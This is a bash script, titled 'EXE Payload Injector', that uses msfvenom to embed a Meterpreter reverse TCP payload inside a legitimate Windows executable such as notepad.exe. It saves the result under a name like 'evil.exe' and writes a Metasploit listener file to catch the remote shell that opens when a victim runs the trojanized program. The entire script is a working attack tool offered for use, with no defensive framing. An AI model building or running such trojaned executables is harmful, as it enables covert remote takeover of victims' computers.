#!/bin/bash

echo "==============================="
echo "      EXE Payload Injector     "
echo "==============================="

# Ask for LHOST and LPORT
read -p "🌐 Enter LHOST: " lhost
read -p "🎯 Enter LPORT: " lport

# Loop to ensure the EXE file exists
while true; do
    read -p "Enter the path to a clean EXE file (e.g., notepad.exe): " input_exe
    if [ -f "$input_exe" ]; then
        break
    else
        echo "[!] File not found. Please enter a valid path to an EXE file."
    fi
done

# Detect architecture using file command
arch=$(file "$input_exe" | grep -qE "PE32\+|x86-64" && echo "x64" || echo "x86")

# Print detected architecture in a clearer way
echo ""
echo "========================================="
echo "✅ Architecture detected: $arch"
echo "========================================="

# Select payload based on architecture
if [ "$arch" == "x64" ]; then
    payload="windows/x64/meterpreter/reverse_tcp"
else
    payload="windows/meterpreter/reverse_tcp"
fi

echo "[*] Using payload: $payload"

# Ask for output filename
read -p "Enter the output file name (e.g., evil.exe): " output_exe

# Generate and inject the payload
echo "[*] Injecting payload into $input_exe..."
msfvenom -p "$payload" LHOST=$lhost LPORT=$lport --platform windows -a "$arch" -x "$input_exe" -f exe -o "$output_exe"

# Check if injection was successful
if [ $? -eq 0 ]; then
    echo "[+] Payload injected successfully! Saved as: $output_exe"

    # Create Metasploit listener file
    listener_file="listener.r"
    echo "use exploit/multi/handler" > "$listener_file"
    echo "set payload $payload" >> "$listener_file"
    echo "set LHOST $lhost" >> "$listener_file"
    echo "set LPORT $lport" >> "$listener_file"
    echo "set ExitOnSession false" >> "$listener_file"
    echo "exploit -j" >> "$listener_file"

    echo "[+] Metasploit listener script saved as: $listener_file"
    echo "[*] You can run it using: msfconsole -r $listener_file"

else
    echo "[!] Injection failed. Please check your inputs."
fi










